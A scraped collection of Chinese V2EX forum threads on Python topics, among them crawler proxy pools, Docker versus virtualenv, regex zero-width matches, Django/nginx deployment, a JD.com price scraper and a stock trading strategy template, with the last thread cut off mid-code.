{"content": "", "reply": "2", "tittle": "请问代理池用 adsl vps 切换可行么 一定需要在 vps 跑项目么？可以把 vps 弄成代理服务器 然后在另外服务器上调用这个代理么", "comment": ["crawler ？可行，不一定，可以", "可以 我这么干过，当时开了 300 台 vps ，五分钟一换 ip ，做成 socks 5 代理。后来不干的原因是， tm   vps 拨号太烂经常 691 ，而且管理 300 服务器要死人。而且那些 vps  得 ip 就那么点。后来就直接网上去买代理，省的维护。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>from collection import defaultdict\n\ntree = lambda: defaultdict(tree)\n</code></pre>\n<p>运行：</p>\n<pre><code>tree['foo']['bar'] = 'span'\n</code></pre>\n<p>结果：</p>\n<pre><code>{'foo', {'bar': 'span'}}\n</code></pre>\n<p>无法理解 <code>lambda</code> 函数里面的递归，可否解释一下代码究竟是怎么样执行的？</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "如何理解这段代码（一行代码实现一个树结构字典）？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Docker 的主要优势是能让开发环境和生产环境保持一致，部署时也能方便扩容。</p>\n<p>Python Web 项目，用 virtualenv 来隔离一个独立的环境，在 mac ， linux ， win 三种开发环境下，也都能隔离出一个通用的开发环境和依赖库文件。在部署生产机也用相同的 virtualenv 环境，包括扩容，也很干净方便。</p>\n<p>现在都是用的云主机，实际上是在硬件上虚拟的计算环境，再在这个虚拟的环境中，再用 docker 虚拟一个开发环境，来开发和部署 Python web 项目，有必要吗？比 virtualenv 环境优势在哪儿？</p>\n</div></div>"], "reply": "21", "tittle": "Python Web 项目（如 django, flask）有必要上 Docker 吗？感觉 virtualenv 的环境隔离已经够用了啊", "comment": ["刚开始用 Python 做项目不知道我对 virtualenv 的理解对不对。 VirutalEnv 你要先有服务器，然后在上面配好虚拟的环境，然后再部署自己的程序，对么？\r", "docker 的话，写好 dockerfile 之后，这些是可以自动的，所以你需要自动化环境的时候就很方便，比如临时需要自动增加减少服务器的实例之类的", "virtualenv 只是用来隔离 Python 版本，做不到其他的隔离。", "virtualenv 做到包隔离， pyenv 能做 python 版本隔离， docker 的隔离性更好，但是有一些 openvz 的 vps 不支持", "一个项目用 python2.7,另一个用 python3.5", "建议了解一下持续交付之类运维的知识，如果放在开发上， docker 确实好处不明显。", "Docker 的主要优势是能让开发环境和生产环境保持一致，部署时也能方便扩容。\r", "\r", "这是虚拟环境的主要优势，不是 docker 的优势\r", "\r", "docker 的优势比这多多了\r", "\r", "不然为什么有虚拟机还要用 docker ？", "“ Docker 的主要优势是能让开发环境和生产环境保持一致”\r", "\r", "这句话理解起来有偏差。\r", "\r", "Docker 的主要优势的是让 生产环境和理想生产环境一致。\r", "\r", "简单理解可以是同一个虚拟环境，所以方便大规模部署，比如分布式。\r", "\r", "这仅仅是交付上的，如果有大规模计算的话存在 docker 的编排系统会更好地对多容器的策略管理\r", "\r", "回答楼主问题\r", "\r", "1. 现在都是用的云主机，实际上是在硬件上虚拟的计算环境，再在这个虚拟的环境中，再用 docker 虚拟一个开发环境，来开发和部署 Python web 项目，有必要吗\r", "\r", "    如果同一个程序需要部署 1000 台主机，假如这 1000 台主机是同时有硬件和软件差异的， docker 可以提供一致性的条件\r", "\r", "2. 比 virtualenv 环境优势在哪儿\r", "\r", "    假设这样一个场景，如果同一个程序需要部署 1000 台主机，假如这 1000 台主机是同时有硬件和软件差异的，你的 python 程序对系统软件有需求(比如需求特定操作系统依赖) ，那你需要对 1000 台都去 cherk 这个依赖的正确性。\r", "\r", "    再假设这样一个场景，如果你的环境被黑了， docker 也可以提供一个更安全的环境。", " 实际上安全作用很小，这个是另外一个话题\r", "\r", "其实 Virtualenv 比较麻烦的一个点在于如果需要 C/C++依赖时这个就很麻烦了，就像 @", " 提到的那样，对运维带来的收益比开发大得多。", " 从两个角度分开去看， Docker 优势又都不怎么突出了啊：\r", "1 、关于开发环境和生产环境的一致性：用 venv 也可以解决“我本机上跑通了的啊，怎么线上挂了”的问题 。\r", "2 、云主机的部署和运维：也不需要每台机器装系统&配置环境，直接镜像部署就可以，也比较方便的。", "python-lxml 等一票 c/c++依赖表示 virtualenv 只能说是很一般的隔离。。。", " \r", "一看你就没装过 pillow 、 python-lxml 、 psycopg2 。昨天还有人跟我反馈他在 centos 上死也装不好 psycopg2 。\r", "楼上说得对~", "virtualenv 只是用来隔离不同工程所需的不同的依赖的。", " \r", "\r", "1. 11 楼回复正解\r", "2. 镜像部署相比 docker 有缺点，缺点在于分布式的粒度没有 docker 小， docker 他的实现不是基于虚拟化而是基于 chroot 、 namespace 、 cgourp 这些存在于本机内核的环境隔离(所以很轻量)，比如说一台物理机你跑虚拟化的资源肯定比不上 docker 的资源占用小。", " 你说到要点上了，我知道差别啦，赞", "docker 是一个文本文件，里面写好了命令，在服务器执行一下，然后你就去喝咖啡， 你的项目会自动部署好\r", "\r", "你用 pyv 还要自己一个命令一个命令的弄半天\r", "\r", "这就是差距", "没什么必须的。适合自己的就是最好的。\r", "\r", "Docker 的优势是一个用一个 Dockerfile 可以方便的 scale 出任意台一样的主机。\r", "\r", "缺点是你需要付出额外的成本来进行配置。每个 container 要做成 stateless 的，数据库要用外置。如果你的项目很小，这个是额外的麻烦。\r", "\r", "多台主机部署和运维可以用 Ansible 啊。也不一定要 Docker 。", "用 docker 的好处，难道不是在 PostgreSQL 、 Redis 、 elastic search 这些组件上吗？全都 docker 化了。", "我在尝试用 docker-compose 部署 Django 项目", "部署时好处比较明显，因为内部的复杂度都被容器屏蔽了。\r", "\r", "除非出于好奇或学习的目的，在使用这个或那个系统时是不需要关心内部的。\r", "\r", "但对于足够简单的项目，不用容器也复杂不了多少。", " 在集群上做容器编排简直就是小公司噩梦…", "docker 的好处不是环境统一，组件隔离吗！"]},
{"content": ["<div class=\"topic_content\">我 google 下，都是 string 如何转 byte 的，请问如果简单的实现该功能。</div>"], "reply": "9", "tittle": "\"abc\"转 b\"abc\"，这样 string 直接转 byte， python 有没有方法？", "comment": ["eval 么 😂", "bytearray()", "In [2]: x.encode(\"utf-8\")\r", "Out[2]: b'abc'", "a = \"abcdefg 你好\"\r", "b = a.encode()\r", "print(b)", "楼上都说了", "encode", "好吧.我傻了.被编码解码搞糊涂了", "我也容易记反", " 总是容易把 encode 记做编码为某种字符编码的字符串。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>平常主要是依靠 Python(PyCharm) + Java(Intellij)做开发</p>\n<p>对于某一个用户自定义的方法都可以通过 Navigate-&gt;Test 来创建单测</p>\n<p>用 Intellij 的 Maven 框架的话，创建单元测试非常舒服，自动会在对应的 test 目录下面建立相应的文件</p>\n<p>例如\nsrc/main/java/abc/run.java\n对应的测试文件是\ntest/java/abc/runTest.java</p>\n<p>但是 Pycharm 就蛋疼了，同样自动创建单元测试，其目录结构直接就是在相同目录下创建\n例如在 src 目录下\nsrc/abc/<a href=\"http://run.py\" rel=\"nofollow\">run.py</a>\n自动创建的文件位置\nsrc/abc/<a href=\"http://test_run.py\" rel=\"nofollow\">test_run.py</a></p>\n<p>巨丑，，</p>\n<p>目前我是手动集中到一个新建的 test 目录下，尽量模仿 Maven 格式，但总觉的路子有点野</p>\n<p>不知道有木有 Python 大神，知道正规 or 人性化 的 Python 单测方法</p>\n</div></div>"], "reply": "14", "tittle": "Python 蛋疼的单元测试", "comment": ["不同的语言其设计的哲学不相同，因此会造成一些使用习惯上的差别，而 python 比较灵活，除了编码规范等大家有一些共识之外，还是有很多地方是需要开发者自己来考虑的。\r", "\r", "我个人的看法是，暂时先不用太在意这些细节，先将你的功能开发完成，把测试跑通，再和你的小伙伴一起讨论出一套自己的风格，然后遵循它并不断完善改进之。", "nose", "建到同一目录下是 PyCharm 的锅吧, 和 Python 有什么关系…", "请使用 pytest\r", "不过这个框架是很 pythonic 的,你若是习惯写 Java 可能不不习惯它。不过你说的事情，跟语音无关跟测试框架以及配置有关", " 是这样的，跟 Python 没啥关系，，这个问题应该描述为\r", "更好的 Pycharm 插件，，或者是 高效的单元测试的 目录结构。。。", " , @", " , nose ， pytest or unitest 都是测试的一些框架，从 Python Integrated Tools 中就能自己选择不同的框架，效果是一样的。\r", "\r", "这里描述的问题，，自动创建的时候都是在同一级目录中创建。。。\r", "所以想请假的是 一个合理的 Python 单元测试目录结构。。。", "pytest 是 python 做 unittest 的首选框架，以及，你用 pycharm 创建 unittest 的方式错了， tests 目录需要自己建，单元测试的文件放在这个目录下，命名 test_UNIT.py 。", " 没有什么合理不合理，你认为效果都是一样的那是你没有去了解他们，我自己写测试就是放在根目录下面的一个 tests 文件夹里的。所以我就说跟配置相关嘛。", "=。= Python 单测的习惯就是不像 Java 那样连都一定要一一对应吧，你看 requests 、 django 、 httpie 不都是主目录下一个 test ，里面的结构和项目代码的组织结构也不是一样对应的，更像是按照功能划分的。毕竟语言的组织结构就不一样。", "你就想，单元测试也是代码的一部分，就好了", "这锅 python 该接吗？急，在线等", ", @", " , @", " \r", "\r", "说的有道理~~\r", "\r", "Github 里面的成型项目,,,的确就是这么搞的,, 根目录下建立一个 tests\r", "\r", "然后按照 test_UNIT.py 这种格式来命名，如果代码量较多则根据功能建立些子文件夹，应该就是这个样子", "玩 python\r", " \r", " \r", " \r", "\r", " \r", " \r", " \r", " \r", " \r", " \r", " \r", "\r", " \r", " \r", " \r", "要你妹单元测试", "看来就我一个人是这么写测试的吗...."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>import urllib, base64\nfrom bs4 import BeautifulSoup</p>\n<p>def fetch(k):</p>\n<pre><code>     url = base64.decodestring(\"aHR0cDovL3NlYXJjaC5qZC5jb20vU2VhcmNoP2tleXdvcmQ9JXMmZW5jPXV0Zi04JndxPSVz\") % ((urllib.quote(k),)*2)\n\n     ret = map(lambda l:[l.attrs.get('data-sku') or '']+map(lambda x: x.text.strip() if x else '',[l.select_one(css) for css in ['div.p-price i', 'div.p-name a']])+(lambda x: [x.attrs.get('src') or x.attrs.get('data-lazy-img')] if x else [''])(l.select_one('div.p-img a img')), BeautifulSoup\n</code></pre>\n<p>(urllib.urlopen(url), 'html.parser', from_encoding='utf-8').select(\"#J_goodsList ul li\"))</p>\n<pre><code>     return filter(lambda r: True if '' not in r else False, ret)\n</code></pre>\n<p>if <strong>name</strong> == \"<strong>main</strong>\":</p>\n<pre><code>for l in fetch('iphone'):\n    print l\n</code></pre>\n</div></div>"], "reply": "11", "tittle": "还是 python 好玩", "comment": ["base64.decodestring(\"aHR0cDovL3NlYXJjaC5qZC5jb20vU2VhcmNoP2tleXdvcmQ9JXMmZW5jPXV0Zi04JndxPSVz\")\r", "\r", "不懂你为什么要先 encode 再 decode 。隐藏什么东西？？？", "aHR0cDovL3NlYXJjaC5qZC5jb20vU2VhcmNoP2tleXdvcmQ9JXMmZW5jPXV0Zi04JndxPSVz\r", "握草, 新式广告?", "乱了，复制下来运行了下，是爬 jd 商品价格的爬虫", "现在爬价格还不够啊。还得把各种券的组合算出来。。。累。", "玩 one-liner 为什么不去玩 ruby ……", "楼主你要牛逼啊，居然能写出这么难看的代码！佩服", "过于炫技了吧， lambda 满天飞", "PEP8 标准是一行少于 79 字符，不如拆开写。", "就算炫技，也要写的别人能看清楚，对不？\r", "\r", "```\r", "def fetch(k):\r", "    url = '", "\r", "        k=urllib.quote(k))\r", "\r", "    return filter(all, (\r", "        [l.attrs.get('data-sku')] +\r", "        [x and x.text.strip() for x in map(l.select_one, [\r", "            'div.p-price i', 'div.p-name a'])] +\r", "        (lambda x: [x and (x.attrs.get('src') or x.attrs.get('data-lazy-img'))])(\r", "            l.select_one('div.p-img a img'))\r", "        for l in BeautifulSoup(urllib.urlopen(url), 'html.parser',\r", "                               from_encoding='utf-8'\r", "                               ).select(\"#J_goodsList ul li\")\r", "    ))\r", "```", "程序要让你看得懂，看不懂 的程序 任何语言都可以写出来。\r", "PYTHON 的优点是写出来的程序 简洁清楚，而不是这样玩。"]},
{"content": ["<div class=\"topic_content\">&gt;&gt;&gt; re.findall(r'xy','xy123') #从源文本 xy123 中找 xy 刚好找到一个。\r<br>['xy'] \r<br>&gt;&gt;&gt; re.findall(r'x','xy123')   #从源文本 xy123 中找 x 刚好找到一个。\r<br>['x']\r<br>&gt;&gt;&gt; re.findall(r'x?','xy123') \r<br>['x', '', '', '', '', ''] \r<br>\r<br>最后这个实在无法理解，\r<br>从中找 x 重复 0 次或者 1 次，如果 x 重复 1 次，得到 x,\r<br>关键是重复 0 次怎么理解？输出的结果里有 5 个表示空东西的东西，但是源文本 xy123 中没有它啊？！</div>"], "reply": "15", "tittle": "正则 re.findall(r'x?','xy123'),x 重复 0 次是什么意思？", "comment": ["不要理解为\"重复\"，理解为\"匹配\"。", "匹配零次，就是匹配一个空集合，显然，任何\"东西\"都不属于一个空集合。所以 x?,就是匹配字母 x 一次，显然这是跟单独一个 x 是一样的效果，这是因为问号后面没别的条件了", " 然后再看匹配零次，因为只有空元素才能属于空集合。所以，后面字符串有多少个字符，就匹配了多少次空集合", "  好吧 不过 0 次这个实在是头疼\r", "正则的作用，我粗略理解是从源文字中寻找符合匹配模式的东西，\r", "x?  ,如果?是零次的话，匹配模式是个空集合，但是源文字中不是没有空集合么？", " 任何集合与空集的交集，结果都是空集。", "'xy123' 长度为 5 ，所以 re.findall 最多可以在 5 个位置尝试匹配。\r", "第一个位置是在字符串首，匹配到了 'x'。\r", "然后跳过匹配到的字符串，移到 'y' 前面，进行第二次匹配尝试，匹配到 ''。\r", "然后往前移动一个字符，即 'y' 和 '1' 中间，进行第三次匹配尝试，匹配到 ''。\r", "然后往前移动一个字符，即 '1' 和 '2' 中间，进行第四次匹配尝试，匹配到 ''。\r", "然后往前移动一个字符，即 '2' 和 '3' 中间，进行第五次匹配尝试，匹配到 ''。\r", "然后往前移动一个字符，即串尾，结束所有匹配尝试。\r", "\r", "任何文本都包含 ''。", "更正\r", "\r", "'xy123' 长度为 5 ，所以 re.findall 最多可以在 5 个位置尝试匹配。\r", "第一个位置是在字符串首，匹配到了 'x'。\r", "然后跳过匹配到的字符串，移到 'y' 前面，进行第二次匹配尝试，匹配到 ''。\r", "然后往前移动一个字符，即 'y' 和 '1' 中间，进行第三次匹配尝试，匹配到 ''。\r", "然后往前移动一个字符，即 '1' 和 '2' 中间，进行第四次匹配尝试，匹配到 ''。\r", "然后往前移动一个字符，即 '2' 和 '3' 中间，进行第五次匹配尝试，匹配到 ''。\r", "然后往前移动一个字符，即串尾，进行第五次匹配尝试，匹配到 ''。\r", "\r", "任何文本都包含 ''。", "更正\r", "\r", "'xy123' 长度为 5 ，所以 re.findall 最多可以在 6 个位置 (想像光标插入位置) 尝试匹配。\r", "第一个位置是在字符串首，匹配到了 'x'。\r", "然后跳过匹配到的字符串，移到 'y' 前面，进行第二次匹配尝试，匹配到 ''。\r", "然后往前移动一个字符，即 'y' 和 '1' 中间，进行第三次匹配尝试，匹配到 ''。\r", "然后往前移动一个字符，即 '1' 和 '2' 中间，进行第四次匹配尝试，匹配到 ''。\r", "然后往前移动一个字符，即 '2' 和 '3' 中间，进行第五次匹配尝试，匹配到 ''。\r", "然后往前移动一个字符，即串尾，进行第六次匹配尝试，匹配到 ''。\r", "\r", "任何文本都包含 ''。", "  你看看 @", "  写的 更详细。", "  刚才刚好去搜索了 互联网找到这份内容：\r", "’ 对于字符串” 123 “而言，包括三个字符四个位置。正则表达式匹配过程中，如果子表达式匹配到东西，而并非是一个位置，并最终保存到匹配的结果当中。这样的就称为占有字符，而只匹配一个位置，或者是匹配的内容并不保存到匹配结果中，这种就称作零宽度，后续会讲到的零宽度断言等。占有字符是互斥的，零宽度是非互斥的。也就是一个字符，同一时间只能由一个子表达式匹配，而一个位置，却可以同时由多个零宽度的子表达式匹配。‘\r", "\r", "然后看到您的回复，感觉好像是这样子：\r", "源文件是由两个部分组成，可以看到的占有字符，另一部分是字符两边的位置。\r", "xy123 是 5 个字符， 6 个位置。\r", "不过这样的话 6 个位置都符合 x?中 0 次的空集合啊，那这样结果是少匹配到一次 ''？？？ \r", "这种东西深入理解还要从原理上理解。\r", "或者从例子中实践记住结果，当个实践派。", " \r", "/x?/ 是贪婪匹配，匹配尽可能长的字符串，能匹配 'x' 就不匹配 ''。", "源字符： xyx\r", "或者写成 。 x 。 y 。 x 。（用。表示位置）\r", "表达式： x?\r", "Match 1\r", "Full match\t0-1\t`x`\r", "Match 2\r", "Full match\t1-1\t``\r", "Match 3\r", "Full match\t2-3\t`x`\r", "Match 4\r", "Full match\t3-3\t``\r", "=。=。=。=。=。=\r", ">>> re.findall(r'x?','xyx') #正则匹配模式含有空集合\r", "['x', '', 'x', '']\r", ">>> re.findall(r'x??','xyx')\r", "['', '', '', '']\r", "通过实践可知，如果正则匹配模式含有空集合的话，匹配的时候，字符与位置是同时参与的，之前理解的是根据先后关系先字符前面的位置然后是字符。两者同时参与正则模式匹配，根据贪婪模式或者非贪婪模式选其一（匹配字符或者位置）。\r", "\r", "你需要看《精通正则表达式》。\r", "\r", "如果没有一个系统的学习，这些类似困惑会在每次使用正则表达式的时候都阴魂不散…", "In [2]: re.findall('x{1}', 'xy123')\r", "Out[2]: ['x']\r", "\r", "In [3]: re.findall('x{0,1}', 'xy123')\r", "Out[3]: ['x', '', '', '', '', '']", "你需要看精通正则表达式+1\r", "贪婪模式下引擎是个吃货，一口吃饱，然后吐出来\r", "第一步，从\r", "[xy123] []\r", "开始，一口口吐出来，直到\r", "[x] [y123]\r", "符合了 x ？\r", "\r", "第二步从\r", "[y123] []开始\r", "直到\r", "[][y123]\r", "也符合 x ？，因为有 0 个 x\r", "\r", "这次引擎一个字符都没吞，如果不吞一个的话，就死循环了，所以必须吞掉一个字符， y 没了\r", "\r", "第三步，从\r", "[123] []开始，后面和第二步一样\r", "\r", "直到第五步结束后，强行吞掉 3 ，字符串已经没有了\r", "所以引擎停止，总共执行了 5 次，五次都匹配到了", "至于你这个为啥是六次，我就不知道了，可能是 3 后面还有个\\n"]},
{"content": ["<div class=\"topic_content\">在亚马逊 EC2 上使用 nginx+uwsgi 部署 django 项目。首页能正常打开，但是其他页面都报 404 。我在本地使用 python manage.py runserver 都是正常的。为什么部署到 EC2 就打不开其他页面了？？？系统是 ubuntu 14.04</div>", "<div class=\"topic_content\">刚才又调了一下，发现打开首页的时候， uwsgi.log 有日志记录，如下：\r<br>pid: 24653|app: 0|req: 2/5] 115.44.152.130 () {42 vars in 881 bytes} [Sun Nov  6 21:30:08 2016] GET / =&gt; generated 1894 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 102 bytes (1 switches on core 0)\r<br>\r<br>但是打开登录和其他页面（报 404 错误的页面）的时候， uwsgi.log 中不产生任何日志记录。我猜想是不是 Nginx 没有将请求转发到 uwsgi ，所以找不到页面？\r<br>\r<br>也查了下 nginx 的 error.log 记录，并没有产生错误记录。</div>", "<div class=\"topic_content\">处理好了， Nginx 的默认配置有个调起 404 页面的配置没有注释掉。所以非主页（第一个页面）的的请求直接就到 Nginx 的 404 了。</div>"], "reply": "12", "tittle": "Django+nginx+uwsgi 部署问题", "comment": ["检查下静态文件的路径", "我也遇到过，不知道是不是地址少了 /之类的。", " 我本地是 OK 的，你说的地址问题是说 nginx 和 uwsgi 的配置文件？", "有看过错误日志么", "我之前也是本地点击链接正常，但是部署之后莫名其妙的 404 。举个例子： ", " 这样就 404 。然后如果加个 /就可以， ", " 不是这个问题，静态文件的路径我也查了，没问题", "collectstatic 了吗", " 用了", " 我的 nginx 配置  也是 uwsgi+django  你可以参考下", "看描述应该是 Nginx 没配置好，建议把 Nginx 配置贴出来", "nginx 的 404 和 Django 自己的 404 长得不一样，你仔细看看，确认是哪部分的问题"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有一个 while 循环需要不断的收集用户的兴趣标签，比如：运动、读书、电影等等，然后把这些标签不断的 append 的一个列表 A 中。</p>\n<p>在 while 循环的过程中，并不存储到数据库中，只是临时存储到 sqlalchemy session 中，等整个循环做完了，在把这个列表 A 存储。</p>\n<p>这样有个问题，比如“读书”这个标签出现两次，列表 A 中会出现两个“读书”字符串。</p>\n<p>用什么方式，可以在查询 session 中是否已经有重复的数据出现？</p>\n</div></div>"], "reply": "5", "tittle": "sqlalchemy session 中的数据，可以查询吗？", "comment": ["你是要查 session 还是列表 A ？看完你的描述也是一头包。\r", "session 用来暂存数据库数据的是个 dict ，何来重复之说， see: ", "\r", "\r", "要是 list 的重复项的话，不告诉你，这是 Python 的高级用法", " 查 sqlalchemy session 重的数据，不是列表 A 中的数据。检查列表中是不是有某个数据 for in 判断一下就可以了。但是，这个字符串还在 sqlalchemy session 中的时候，怎么判断？\r", "\r", "list 去重的方法很多吧，只是不想生成列表后再去重，是想不把重复数据加到列表里去。", " 怎么算重，你的“读书”是主键？自己 pdb ，看看 identity_map", " 就是列表 A 中出现，比如：['读书', '电影', '读书']，出现两次'读书'就算重复啊", "  虽然不是很明白你的问题. 但是\r", "那你用 set 来存储就不会有重复的了.\r", "\r", "另外: 一个临时的列表为什么需要保存到 SQLAlchemy 的 session 中而不是其他地方呢?"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2><strong>一个新手适用的交易模型的模板</strong></h2>\n<p><strong>新鲜出品： <a href=\"https://www.ricequant.com/community/topic/1150/?utm_source=v2ex\" rel=\"nofollow\">https://www.ricequant.com/community/topic/1150/?utm_source=v2ex</a></strong></p>\n<p>关键词：策略模板、策略、策略交易、新人、模板、模块……</p>\n<p>引言：\n在 rice 里混了大半年了，学习了不少大牛的有用知识，也编写了一大堆的有的没的策略，但是每次都面临大量的重复劳动，费时费力，于是这里就总结了一个适合新人的交易策略的模板分享给大家。</p>\n<p>原理:\n看了大家的策略，和查阅了一些资料，也总结了和归纳了一些，大概分为，选股、进场时机、持仓平衡、现金管理、出场时机、风险管理，一些工具组件~\n不废话了，直接上 demo 代码简单写~</p>\n<p>模板代码：\n说明：分钟回测，组合初始 100 万现金，交易手续默认的，无卖空， benchmark 为默认，进场策略输出了股票列表，出场策略也是返回要卖出的股票列表……</p>\n<p>1 、传奇的小市值策略（市值最小的 100 只股票做为每天的备选列表），这个因子表现的最好，为避免模板的 demo 曲线表现太差，所以用了这个吸引眼球的选股因子，高手勿喷，勿笑；</p>\n<p>2 、进场以大家熟悉的 5 日均线上传 10 日均线，并保持 20 日线为进场条件；（感觉自己写复杂了，反正是模板）</p>\n<p>3 、出场为低于 20 日线的 99%为强制出场（ 20 日线，在近两年基本作为了行业标配了，反正有点用）</p>\n<p>4 、持仓策略：在市值不便的情况下平均持仓，每日临近收盘进行再平衡，理想情况保持每只持仓占比相等（</p>\n<p>5 、现金管理：本来想再收盘前现金买进“银华日利”，但由于默认市价交易滑点太大，就省略了（要限价交易才可能有利润，但是这里也发现尾盘表现非常不好，就注释掉了）</p>\n<p>6 、风险管理：略了，流传一个大盘跌过 3%的强制止损风险策略，小市值也可以增加二八轮动的择时，没有加上，有兴趣可以自己弄着玩，加这个模块里；</p>\n<p>7 、交易方式：为了避免过大的成家量超过 25%的 error ，这里都下的限价单，但是后续模块化吧，另控制了单只持仓不超过 10%~（模块写起来比较复杂，还要新建 dict 进行撤单再下单等计算，后续成熟了，再拿出来分享）</p>\n<p>8 、工具：</p>\n<p>trans 、历史数据强制转化成真正的 DataFrame(效率问题，做了.T 的来回变换)，问 licco 说，其实 2016 年 5 月 2X 后就不需要了</p>\n<p>n 日内随机交易的收益率概率（例子中未用到）</p>\n<p>多个 list 里取交集，懒得每次都写了，干脆写了个小函数</p>\n<p>标的上市自然日的函数，避免次新股对收益干扰太大，要真像炒次新股，要好好研究一下，个人做过尝试发现，高风险高利润，大盘择时比较关键，干脆这里做了过滤比如一定要上市超过 60 个自然日</p>\n<p>是否涨跌停区间，一定要可交易，人家都封版了，交易量有，关咱策略毛事，所以也进行了过滤</p>\n<p>因为分钟回测，所以选择了 14 ： 50 作为买入时间点，而出场选择每 15 分钟采样计算一次（性能压力和必要性的问题）， 14 ： 59 （后来发现深圳市场应该 14 点 56 ，要不 57 开始深圳会集合竞价了，但是例子里没有调整，所以还是 error 一大堆，见笑了）</p>\n<p>最后，个人也是新学小白用户，以新人最常见的 5 日金叉做例子，结合小市值选股做了这个模板，期望可以减少新人的重复无价值劳动~另还请大牛们给与指正~</p>\n<pre><code>import pandas as pd\nimport numpy as np\nimport time\nimport math\nimport itertools\n\n# 数据准备\n\ndef init_variables (context):\n    context.init = 0 \n    context.days = 0\n    context.barcount = 0\n    context.choosenum = 300\n    context.obv = 50\n    context.tj1 = 5 # 5 日均线\n    context.tj2 = 10 # 10 日均线\n    context.tj3 = 20 # 20 日均线\n    context.his = pd.DataFrame()\n    return\n\n\n'''第 1 部、选择标的'''\n\ndef choose_target(context):\n    # 最小市值的 100 只标的\n    df = get_fundamentals(\n        query(fundamentals.eod_derivative_indicator.market_cap)\n        .order_by(fundamentals.eod_derivative_indicator.market_cap.asc())\n        .limit(context.choosenum)\n    )\n    context.stocks = [stock for stock in df][:100]\n    return context.stocks\n\n'''第 2 部、入场策略'''\n#2.1 大盘环境问题\n    #可增加外部数据\n\n#2.2 个股选择问题，最后还要过滤非跌停、上市天数、非停牌的标的（ st 未过滤）\ndef for_buy(context, bar_dict, his):\n    #2.2.1 备选中标的站上 5 日线\n    def tj1(context, bar_dict, his):\n        ma_n = pd.rolling_mean(his, context.tj1)\n        temp = his - ma_n\n        temp_s = list(temp[temp&gt;0].iloc[-1,:].dropna().index)\n        return temp_s\n    #2.2.2 备选中标的站上 10 日线\n    def tj2(context, bar_dict, his):\n        ma_n = pd.rolling_mean(his, context.tj2)\n        temp = his - ma_n\n        temp_s = list(temp[temp&gt;0].iloc[-1,:].dropna().index)\n        return temp_s\n    \n    #2.2.2 所谓金叉，今天短均线大于长均线，上一个 bar 反之\n    def tj3(context, bar_dict, his):\n        mas = pd.rolling_mean(his, context.tj1)\n        mal = pd.rolling_mean(his, context.tj2)\n        temp = mas - mal\n        temp_jc = list(temp[temp&gt;0].iloc[-1,:].dropna().index)\n        temp_r = list(temp[temp&gt;0].iloc[-2,:].dropna().index)\n        temp = []\n        for stock in temp_jc:\n            if stock not in temp_r:\n                temp.append(stock)\n        return temp\n    \n    #整合各个子条件的交集\n    \n    l1 = tj1(context, bar_dict, his)\n    l2 = tj2(context, bar_dict, his)\n    l3 = tj3(context, bar_dict, his)\n    l_tar = jj_list([l1,l2,l3])\n    to_buy = []\n    #过滤上市时间、是否涨停、是否停牌等条件\n    if l_tar:\n        for stock in l_tar:\n            con1 = ipo_days(stock,context.now)&gt;60\n            con2 = zdt_trade(stock,context,bar_dict)\n            con3 = bar_dict[stock].is_trading\n            if con1 &amp; con2 &amp; con3:\n                to_buy.append(stock)\n    return to_buy\n\n\n'''第 3 部、持仓组合的微调策略'''\n# 平均市值做微调\ndef for_balance(context, bar_dict):\n    #mvalues = context.portfolio.market_value\n    #avalues = context.portfolio.portfolio_value\n    #per = mvalues / avalues\n    hlist = []\n    for stock in context.portfolio.positions:\n        hlist.append([stock,bar_dict[stock].last * context.portfolio.positions[stock].quantity])\n    \n    if hlist:\n        hlist = sorted(hlist,key=lambda x:x[1], reverse=True)\n        temp = 0\n        for li in hlist:\n            temp += li[1]\n        for li in hlist:\n            if bar_dict[li[0]].is_trading:\n                order_target_value(li[0], temp/len(hlist))\n    return\n\n'''第 4 部、出场策略'''\n# 小于 20 日均线，并且可交易，没跌停\ndef for_sell(context, bar_dict):\n    to_sell = []\n    for stock in context.portfolio.positions:\n        con1 = bar_dict[stock].last &lt; 0.99 * bar_dict[stock].mavg(20, frequency='day')\n        con2 = bar_dict[stock].is_trading\n        con3 = zdt_trade(stock,context,bar_dict)\n        if con1 &amp; con2 &amp; con3:\n            to_sell.append(stock)\n    return to_sell\n\n'''第 5 部、闲置资金效率最大化'''\ndef for_cash(context, bar_dict):\n    cash = context.portfolio.cash\n    #order_target_value('511880.XSHG',cash) 注释掉因为滑点太大，可以买一个货基，或者逆回购\n    return \n\n'''第 6 部、风险控制'''\ndef alert_risk(context,bar_dict):\n    #这里如果给出策略，要强制执行，注意在 handle 优先级高于所有\n    pass\n\n'''第 7 部、备用组件'''\n\n#7.1 将 his 的非标 DF 进行转换， licco 说现在不用转换了，我还是保留了：）\ndef trans(df):\n    temp = pd.DataFrame()\n    for col in df.index:\n        temp[col] = df.T[col]\n    return temp.T\n\n#7.2 计算 n 日概率随机交易的概率收益率\ndef rts_sj(df,n,m): \n    dfp_pct = df.pct_change()\n    def the_list(df,n,m):\n        temp = []\n        for i in range(n,n+m):\n            temp.append(df.iloc[-i,:] + 1)\n        return temp\n    def from_list(self,num):\n        result = []\n        for i in range(1,num+1):\n            result.extend(list(itertools.combinations(self,i)))\n        return result\n    def rts_n(tu):\n        sum0 = []\n        for i in tu:\n            temp = 1\n            for z in i:\n                temp = temp * z\n            temp = temp**(1/len(i))\n            sum0.append(temp)\n        sum1 = 0\n        for i in sum0:\n            sum1 = sum1 + i - 1\n        return sum1/len(sum0)\n    return rts_n(from_list(the_list(dfp_pct,n,m),m)) \n\n#7.3 多 list 获得并集\ndef jj_list(tar_list):\n    temp = tar_list[0]\n    for i in tar_list:\n        temp = list(set(temp).intersection(set(i)))\n    return temp\n\n#7.4 标的上市时间距离参照时间的自然日数量\ndef ipo_days(stock, today):\n    ssrq = instruments(stock).listed_date.replace(tzinfo=None)\n    today = today.replace(tzinfo=None)\n    return (today - ssrq).days\n\n#7.5 判断当前标在可交易区间内（非涨跌停）\ndef zdt_trade(stock, context, bar_dict):\n    yesterday = history(2,'1d', 'close')[stock].values[-1]\n    zt = round(1.10 * yesterday,2)\n    dt = round(0.90 * yesterday,2)\n    return dt &lt; 